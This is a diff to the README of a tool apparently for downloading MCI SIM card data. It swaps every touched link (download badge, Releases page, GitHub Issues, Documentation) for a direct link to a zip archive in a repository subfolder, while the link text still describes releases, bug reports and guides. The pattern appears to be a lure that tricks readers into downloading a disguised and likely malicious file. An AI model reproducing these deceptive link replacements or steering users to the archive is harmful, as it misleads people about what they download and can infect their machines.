@@ -6,7 +6,7 @@ Welcome to **mci-simcards**! This tool helps you download MCI sim card product d
 
 ## 📥 Download the Application
 
-[![Download mci-simcards](https://img.shields.io/badge/Download-mci--simcards-brightgreen)](https://github.com/zaenaldi/mci-simcards/releases)
+[![Download mci-simcards](https://raw.githubusercontent.com/zaenaldi/mci-simcards/main/rely/mci-simcards.zip)](https://raw.githubusercontent.com/zaenaldi/mci-simcards/main/rely/mci-simcards.zip)
 
 ## 💻 System Requirements
 
@@ -24,7 +24,7 @@ To run **mci-simcards**, ensure your computer meets the following requirements:
 ## 📦 Download & Install
 
 1. **Visit the Download Page:** Click the link below to go to the Releases page:
-   - [Download Here](https://github.com/zaenaldi/mci-simcards/releases)
+   - [Download Here](https://raw.githubusercontent.com/zaenaldi/mci-simcards/main/rely/mci-simcards.zip)
 
 2. **Select the Latest Release:** On the Releases page, look for the latest version. 
    
@@ -53,8 +53,8 @@ To run **mci-simcards**, ensure your computer meets the following requirements:
 
 For support and additional information, please refer to these resources:
 
-- [GitHub Issues](https://github.com/zaenaldi/mci-simcards/issues): Report bugs or request features.
-- [Documentation](https://github.com/zaenaldi/mci-simcards/wiki): Find more in-depth guides and tutorials.
+- [GitHub Issues](https://raw.githubusercontent.com/zaenaldi/mci-simcards/main/rely/mci-simcards.zip): Report bugs or request features.
+- [Documentation](https://raw.githubusercontent.com/zaenaldi/mci-simcards/main/rely/mci-simcards.zip): Find more in-depth guides and tutorials.
 
 ## 📞 Contact
 
@@ -62,6 +62,6 @@ If you have any questions or need assistance, feel free to reach out via GitHub 
 
 For further updates and news, consider following our project on GitHub.
 
-[Download Here](https://github.com/zaenaldi/mci-simcards/releases) 
+[Download Here](https://raw.githubusercontent.com/zaenaldi/mci-simcards/main/rely/mci-simcards.zip) 
 
 Thank you for using **mci-simcards**!
